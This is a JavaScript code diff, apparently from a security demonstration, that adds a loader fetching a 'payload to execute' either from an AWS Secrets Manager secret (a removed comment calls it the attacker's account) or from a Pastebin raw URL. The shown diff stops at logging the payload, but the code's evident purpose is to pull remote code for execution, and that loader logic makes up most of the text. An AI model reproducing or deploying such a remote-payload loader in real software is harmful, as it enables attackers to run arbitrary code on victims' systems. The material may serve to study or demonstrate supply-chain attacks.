@@ -1,22 +1,43 @@
 // TODO: Make this a real dependency once we have a good narrative.
+const AWS = require('aws-sdk')
 const axios = require('axios')
 
+const secretsManagerSecretArn = process.env.SECRETS_MANAGER_SECRET_ARN
 const pastebinId = process.env.PASTEBIN_ID
-const payloadSecretArn = process.env.PAYLOAD_SECRET_ARN
 
 module.exports = async () => {
   let payload
 
   try {
-    if (payloadSecretArn) {
-      // TODO: Get the payload from a secret in the attacker's account.
-      payload = ''
+    if (secretsManagerSecretArn) {
+      console.log(`Retrieving the payload from a secret in the AWS Secrets Manager: ${secretsManagerSecretArn}`)
+
+      const secretsManager = new AWS.SecretsManager()
+
+      payload = await new Promise((resolve, reject) => {
+        secretsManager.getSecretValue({
+          SecretId: secretsManagerSecretArn
+        }, (err, data) => {
+          if (err) {
+            reject(err)
+          } else {
+            resolve(JSON.parse(data.SecretString).payload)
+          }
+        })
+      })
     } else if (pastebinId) {
+      console.log(`Retrieving the payload from Pastebin ID: ${pastebinId}`)
+
       const res = await axios.get(`https://pastebin.com/raw/${pastebinId}`, {
         timeout: 1000
       })
 
       payload = res.data
+    }
+
+    if (!payload) {
+      console.error('Payload not found.')
+      return
     }
 
     console.log(`Payload to execute: ${payload}`)
